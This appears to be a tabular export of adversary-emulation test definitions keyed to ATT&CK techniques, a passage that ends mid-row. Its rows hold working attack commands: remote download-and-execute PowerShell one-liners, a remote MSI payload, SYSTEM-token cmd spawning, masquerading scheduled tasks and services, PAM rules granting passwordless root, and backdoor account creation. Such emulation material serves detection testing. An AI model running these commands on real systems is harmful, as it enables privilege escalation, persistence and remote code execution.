T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute the DllUnregisterServer function of a DLL,ab09ec85-4955-4f9c-b8e0-6851baf4d47f,"Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the ""bin"" folder is only built for 64-bit, so this won't work on a 32-bit OS.
",windows,,,"#{msi_exe} /z ""#{dll_payload}""
",command_prompt,,,,powershell,"dependencies.0.description: The DLL must exist on disk at specified location (#{dll_payload})

dependencies.0.prereq_command: if (Test-Path ""#{dll_payload}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_payload}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile ""#{dll_payload}""

","input_arguments.dll_payload.description: DLL to execute that has an implemented DllUnregisterServer function

input_arguments.dll_payload.type: path

input_arguments.dll_payload.default: PathToAtomicsFolder\T1218.007\bin\MSIRunner.dll

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

"
T1218.007,Signed Binary Proxy Execution: Msiexec,Msiexec.exe - Execute Remote MSI file,44a4bedf-ffe3-452e-bee4-6925ab125662,"Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.
",windows,,,"#{msi_exe} /q /i ""#{msi_payload}""
",command_prompt,,,,,,"input_arguments.msi_payload.description: MSI file to execute

input_arguments.msi_payload.type: string

input_arguments.msi_payload.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi

input_arguments.msi_exe.description: MSIExec File Path

input_arguments.msi_exe.type: path

input_arguments.msi_exe.default: c:\windows\system32\msiexec.exe

"
T1134.002,Create Process with Token,Access Token Manipulation,dbf4f5a9-b8e0-46a3-9841-9ad71247239e,"This Action demonstrates how an access token for a specific program can spawn another program under a different owner. 
Adversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. 
This Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe
",windows,,,"Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}
& ""$PathToAtomicsFolder\T1134.002\src\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")
",powershell,True,,,,,
T1134.002,Create Process with Token,WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,ccf4ac39-ec93-42be-9035-90e2f26bcd92,Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn,windows,,,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem,powershell,,,,,,
T1036.004,Masquerading: Masquerade Task or Service,Creating W32Time similar named service using schtasks,f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9,"Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed ""Operation Wocao""",windows,,,"schtasks /create /ru system /sc daily /tr ""cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1"" /tn win32times /f
schtasks /query /tn win32times
",command_prompt,True,,"schtasks /tn win32times /delete /f
",,,
T1036.004,Masquerading: Masquerade Task or Service,Creating W32Time similar named service using sc,b721c6ef-472c-4263-a0d9-37f1f4ecff66,"Creating W32Time similar named service (win32times) using sc just like threat actor dubbed ""Operation Wocao""",windows,,,"sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1""
sc qc win32times
",command_prompt,True,,"sc delete win32times
",,,
T1036.004,Masquerading: Masquerade Task or Service,linux rename /proc/pid/comm using prctl,f0e3aaea-5cd9-4db6-a077-631dd19b27a8,"Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to ""totally_legit"".  This will show up as process name in simple 'ps' listings.
",linux,,,"#{exe_path} & ps
TMP=`ps | grep totally_legit`
if [ -z ""${TMP}"" ] ; then echo ""renamed process NOT FOUND in process list"" && exit 1; fi
exit 0
",sh,,,"rm -f #{exe_path}
",sh,"dependencies.0.description: #{exe_path} must be exist on system.

dependencies.0.prereq_command: stat #{exe_path}

dependencies.0.get_prereq_command: cc -o #{exe_path} PathToAtomicsFolder/T1036.004/src/prctl_rename.c

","input_arguments.exe_path.description: Output Binary Path

input_arguments.exe_path.type: path

input_arguments.exe_path.default: /tmp/T1036_004_prctl_rename

"
T1053.007,Kubernetes Cronjob,ListCronjobs,ddfb0bc1-3c3f-47e9-a298-550ecfefacbd,"Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.
",containers,,,"kubectl get cronjobs -n #{namespace}
",bash,False,,,,"dependencies.0.description: kubectl must be installed

dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""

dependencies.0.prereq_command: which kubectl

","input_arguments.namespace.description: K8s namespace to list

input_arguments.namespace.type: string

input_arguments.namespace.default: default

"
T1053.007,Kubernetes Cronjob,CreateCronjob,f2fa019e-fb2a-4d28-9dc6-fd1a9b7f68c3,"Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.
",containers,,,"kubectl create -f src/cronjob.yaml -n #{namespace}
",bash,False,,"kubectl delete cronjob art -n #{namespace}
",,"dependencies.0.description: kubectl must be installed

dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""

dependencies.0.prereq_command: which kubectl

","input_arguments.namespace.description: K8s namespace to list

input_arguments.namespace.type: string

input_arguments.namespace.default: default

"
T1082,System Information Discovery,System Information Discovery,66703791-c902-4560-8770-42b8a91f7667,"Identify System Info. Upon execution, system info and time info will be displayed.
",windows,,,"systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
",command_prompt,,,,,,
T1082,System Information Discovery,System Information Discovery,edff98ec-0f73-4f63-9890-6b117092aff6,"Identify System Info
",macos,,,"system_profiler
ls -al /Applications
",sh,,,,,,
T1082,System Information Discovery,List OS Information,cccb070c-df86-4216-a5bc-9fb60c74e27c,"Identify System Info
",linux,macos,,"uname -a >> #{output_file}
if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi
if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   
if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi
if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi
uptime >> #{output_file}
cat #{output_file} 2>/dev/null
",sh,,,"rm #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Output file used to store the results.

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1082.txt

"
T1082,System Information Discovery,Linux VM Check via Hardware,31dad7ad-2286-4c02-ae92-274418c85fec,"Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.
",linux,,,"if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i ""Droplet\|HVM\|VirtualBox\|VMware""; fi
if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i ""Xen\|Bochs\|QEMU""; fi
if [ -x ""$(command -v dmidecode)"" ]; then sudo dmidecode | grep -i ""microsoft\|vmware\|virtualbox\|quemu\|domu""; fi
if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i ""vmware\|vbox""; fi
if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i ""vmware\|vbox\|qemu\|virtual""; fi
if [ -x ""$(command -v lspci)"" ]; then sudo lspci | grep -i ""vmware\|virtualbox""; fi
if [ -x ""$(command -v lscpu)"" ]; then sudo lscpu | grep -i ""Xen\|KVM\|Microsoft""; fi
",bash,True,,,,,
T1082,System Information Discovery,Linux VM Check via Kernel Modules,8057d484-0fae-49a4-8302-4812c4f1e64e,"Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.
",linux,,,"sudo lsmod | grep -i ""vboxsf\|vboxguest""
sudo lsmod | grep -i ""vmw_baloon\|vmxnet""
sudo lsmod | grep -i ""xen-vbd\|xen-vnif""
sudo lsmod | grep -i ""virtio_pci\|virtio_net""
sudo lsmod | grep -i ""hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc""
",bash,,,,,,
T1082,System Information Discovery,FreeBSD VM Check via Kernel Modules,eefe6a49-d88b-41d8-8fc2-b46822da90d3,"Identify virtual machine host kernel modules.
",linux,,,"kldstat | grep -i ""vmm""
kldstat | grep -i ""vbox""
",sh,,,,,,
T1082,System Information Discovery,Hostname Discovery (Windows),85cfbf23-4a1e-4342-8792-007e004b975f,"Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.
",windows,,,"hostname
",command_prompt,,,,,,
T1082,System Information Discovery,Hostname Discovery,486e88ea-4f56-470f-9b57-3f4d73f39133,"Identify system hostname for FreeBSD, Linux and macOS systems.
",linux,macos,,"hostname
",sh,,,,,,
T1082,System Information Discovery,Windows MachineGUID Discovery,224b4daf-db44-404e-b6b2-f4d1f0126ef8,"Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.
",windows,,,"REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
",command_prompt,,,,,,
T1082,System Information Discovery,Griffon Recon,69bd4abe-8759-49a6-8d21-0f15822d6370,"This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre 
in order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  
For more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",windows,,,"cscript ""#{vbscript}""
",powershell,False,,,powershell,"dependencies.0.description: Sample script file must exist on disk at specified location (#{vbscript})

dependencies.0.prereq_command: if (Test-Path ""#{vbscript}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{vbscript}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs"" -OutFile ""#{vbscript}""

","input_arguments.vbscript.description: Path to sample script

input_arguments.vbscript.type: string

input_arguments.vbscript.default: PathToAtomicsFolder\T1082\src\griffon_recon.vbs

"
T1082,System Information Discovery,Environment variables discovery on windows,f400d1c0-1804-4ff8-b069-ef5ddd2adbf3,"Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
",windows,,,"set
",command_prompt,,,,,,
T1082,System Information Discovery,"Environment variables discovery on freebsd, macos and linux",fcbdd43f-f4ad-42d5-98f3-0218097e2720,"Identify all environment variables. Upon execution, environments variables and your path info will be displayed.
",linux,macos,,"env
",sh,,,,,,
T1082,System Information Discovery,Show System Integrity Protection status (MacOS),327cc050-9e99-4c8e-99b5-1d15f2fb6b96,"Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.
",macos,,,"csrutil status
",sh,,,,,,
T1082,System Information Discovery,WinPwn - winPEAS,eea1d918-825e-47dd-acc2-814d6c58c0e1,Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput",powershell,,,,,,
T1082,System Information Discovery,WinPwn - itm4nprivesc,3d256a2f-5e57-4003-8eb6-64d91b1da7ce,Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
itm4nprivesc -noninteractive -consoleoutput",powershell,,,,,,
T1082,System Information Discovery,WinPwn - Powersploits privesc checks,345cb8e4-d2de-4011-a580-619cf5a9e2d7,Powersploits privesc checks using oldchecks function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
oldchecks -noninteractive -consoleoutput",powershell,,,"rm -force -recurse .\DomainRecon -ErrorAction Ignore
rm -force -recurse .\Exploitation -ErrorAction Ignore
rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
rm -force -recurse .\LocalRecon -ErrorAction Ignore
rm -force -recurse .\Vulnerabilities -ErrorAction Ignore",,,
T1082,System Information Discovery,WinPwn - General privesc checks,5b6f39a2-6ec7-4783-a5fd-2c54a55409ed,General privesc checks using the otherchecks function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
otherchecks -noninteractive -consoleoutput",powershell,,,,,,
T1082,System Information Discovery,WinPwn - GeneralRecon,7804659b-fdbf-4cf6-b06a-c03e758590e8,Collect general computer informations via GeneralRecon function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive",powershell,,,,,,
T1082,System Information Discovery,WinPwn - Morerecon,3278b2f6-f733-4875-9ef4-bfed34244f0a,Gathers local system information using the Morerecon function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput",powershell,,,,,,
T1082,System Information Discovery,WinPwn - RBCD-Check,dec6a0d8-bcaf-4c22-9d48-2aee59fb692b,Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive",powershell,,,,,,
T1082,System Information Discovery,WinPwn - PowerSharpPack - Watson searching for missing windows patches,07b18a66-6304-47d2-bad0-ef421eb2e107,PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson",powershell,,,,,,
T1082,System Information Discovery,WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,efb79454-1101-4224-a4d0-30c9c8b29ffc,PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
Invoke-SharpUp -command ""audit""",powershell,,,,,,
T1082,System Information Discovery,WinPwn - PowerSharpPack - Seatbelt,5c16ceb4-ba3a-43d7-b848-a13c1f216d95,"PowerSharpPack - Seatbelt technique via function of WinPwn.

[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey ""safety checks"" relevant from both offensive and defensive security perspectives.",windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
Invoke-Seatbelt -Command ""-group=all""; pause",powershell,,,,,,
T1082,System Information Discovery,Azure Security Scan with SkyArk,26a18d3d-f8bc-486b-9a33-d6df5d78a594,"Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. 
Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. 
See https://github.com/cyberark/SkyArk 
",azure-ad,,,"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1"" -force      
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzAccount -Credential $Credential
Connect-AzureAD -Credential $Credential
Scan-AzureAdmins -UseCurrentCred
",powershell,True,,"$resultstime = Get-Date -Format ""yyyyMMdd""
$resultsfolder = (""Results-"" + $resultstime)
remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: The SkyArk AzureStealth module must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1""

dependencies.1.description: The AzureAD module must be installed.

dependencies.1.prereq_command: try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.1.get_prereq_command: Install-Module -Name AzureAD -Force

dependencies.2.description: The Az module must be installed.

dependencies.2.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.2.get_prereq_command: Install-Module -Name Az -Force

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: T1082Az

"
T1082,System Information Discovery,Linux List Kernel Modules,034fe21c-3186-49dd-8d5d-128b35f181c7,"Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.
",linux,,,"lsmod
kmod list
grep vmw /proc/modules
",sh,,,,,,
T1082,System Information Discovery,FreeBSD List Kernel Modules,4947897f-643a-4b75-b3f5-bed6885749f6,"Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.
",linux,,,"kldstat
kldstat | grep vmm
",sh,,,,,,
T1082,System Information Discovery,System Information Discovery with WMIC,8851b73a-3624-4bf7-8704-aa312411565c,"Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:
https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
",windows,,,"wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios
",command_prompt,,,,,,
T1082,System Information Discovery,Driver Enumeration using DriverQuery,bd85e3d1-4aeb-4a1d-850f-7be3cb8d60b9,"Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be
used for Exploitation. 
command /v - provide verbose output but not valid for signed drivers
        /si - provide information about signed drivers 
",windows,,,"driverquery /v
driverquery /si
",command_prompt,,,,,,
T1082,System Information Discovery,System Information Discovery,4060ee98-01ae-4c8e-8aad-af8300519cc7,"The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\Windows\System32\config or c:\Windows\System32\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/
",windows,,,"wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
",command_prompt,True,,,,,
T1082,System Information Discovery,Check computer location,96be6002-9200-47db-94cb-c3e27de1cb36,"Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.
- https://tria.ge/210111-eaz8mqhgh6/behavioral1
",windows,,,"reg query ""HKEY_CURRENT_USER\Control Panel\International\Geo""
",command_prompt,,,,,,
T1082,System Information Discovery,BIOS Information Discovery through Registry,f2f91612-d904-49d7-87c2-6c165d23bead,"Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.
- https://tria.ge/210111-eaz8mqhgh6/behavioral1
- https://evasions.checkpoint.com/techniques/registry.html
",windows,,,"reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
",command_prompt,,,,,,
T1082,System Information Discovery,ESXi - VM Discovery using ESXCLI,2040405c-eea6-4c1c-aef3-c2acc430fac9,"An adversary will using ESXCLI to enumerate the Virtual Machines on the host prior to executing power off routine.
[Reference](https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,False,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name or IP of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to Plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.cli_script.description: Path to file with discovery commands

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1082\src\esx_vmdiscovery.txt

"
T1082,System Information Discovery,ESXi - Darkside system information discovery,f89812e5-67d1-4f49-86fa-cbc6609ea86a,"Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.
[Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)
",linux,,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}""
",command_prompt,False,,,powershell,"dependencies.0.description: Check if plink is available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""

","input_arguments.vm_host.description: Specify the host name or IP of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to Plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.cli_script.description: Path to file containing darkside ransomware discovery commands

input_arguments.cli_script.type: path

input_arguments.cli_script.default: PathToAtomicsFolder\T1082\src\esx_darkside_discovery.txt

"
T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Malicious PAM rule,4b9dde80-ae22-44b1-a82a-644bf009eb9c,"Inserts a rule into a PAM config and then tests it.

Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
",linux,,,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
",sh,True,,"sudo sed -i ""\,#{pam_rule},d"" #{path_to_pam_conf}
",,,"input_arguments.path_to_pam_conf.description: PAM config file to modify.

input_arguments.path_to_pam_conf.type: string

input_arguments.path_to_pam_conf.default: /etc/pam.d/su-l

input_arguments.pam_rule.description: Rule to add to the PAM config.

input_arguments.pam_rule.type: string

input_arguments.pam_rule.default: auth sufficient pam_succeed_if.so uid >= 0

input_arguments.index.description: Index where the rule is inserted.

input_arguments.index.type: integer

input_arguments.index.default: 1

"
T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Malicious PAM rule (freebsd),b17eacac-282d-4ca8-a240-46602cf863e3,"Inserts a rule into a PAM config and then tests it.

Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
",linux,,,"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
",sh,True,,"sudo sed -i """" ""/#{pam_rule}/d"" #{path_to_pam_conf}
",,,"input_arguments.path_to_pam_conf.description: PAM config file to modify.

input_arguments.path_to_pam_conf.type: string

input_arguments.path_to_pam_conf.default: /etc/pam.d/su

input_arguments.pam_rule.description: Rule to add to the PAM config.

input_arguments.pam_rule.type: string

input_arguments.pam_rule.default: auth sufficient pam_succeed_if.so uid >= 0

input_arguments.index.description: Index where the rule is inserted.

input_arguments.index.type: integer

input_arguments.index.default: 8

"
T1556.003,Modify Authentication Process: Pluggable Authentication Modules,Malicious PAM module,65208808-3125-4a2e-8389-a0a00e9ab326,"Creates a PAM module, inserts a rule to use it, and then tests it.

Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
",linux,,,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}
",sh,True,,"sudo sed -i ""\,#{pam_rule},d"" #{path_to_pam_conf}
",,"dependencies.0.description: The PAM development library must be installed to build the PAM module

dependencies.0.prereq_command: if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n ""`which yum`"" ]; then sudo yum -y install pam-devel; fi

dependencies.1.description: The PAM module must exist on disk at specified location (#{path_to_pam_module})

dependencies.1.prereq_command: if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;

dependencies.1.get_prereq_command: sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}

","input_arguments.path_to_pam_conf.description: PAM config file to modify.

input_arguments.path_to_pam_conf.type: string

input_arguments.path_to_pam_conf.default: /etc/pam.d/su-l

input_arguments.pam_rule.description: Rule to add to the PAM config.

input_arguments.pam_rule.type: string

input_arguments.pam_rule.default: auth sufficient /tmp/pam_evil.so

input_arguments.index.description: Index where the rule is inserted.

input_arguments.index.type: integer

input_arguments.index.default: 1

input_arguments.path_to_pam_module_source.description: Path to PAM module source code.

input_arguments.path_to_pam_module_source.type: path

input_arguments.path_to_pam_module_source.default: PathToAtomicsFolder/T1556.003/src/pam_evil.c

input_arguments.path_to_pam_module.description: Path to PAM module object

input_arguments.path_to_pam_module.type: path

input_arguments.path_to_pam_module.default: /tmp/pam_evil.so

"
T1136.001,Create Account: Local Account,Create a user account on a Linux system,40d8eabd-e394-46f6-8785-b9bfa1d011d2,"Create a user via useradd
",linux,,,"useradd -M -N -r -s /bin/bash -c evil_account #{username}
",bash,True,,"userdel #{username}
",,,"input_arguments.username.description: Username of the user to create

input_arguments.username.type: string

input_arguments.username.default: evil_user

"
T1136.001,Create Account: Local Account,Create a user account on a FreeBSD system,a39ee1bc-b8c1-4331-8e5f-1859eb408518,"Create a user via pw
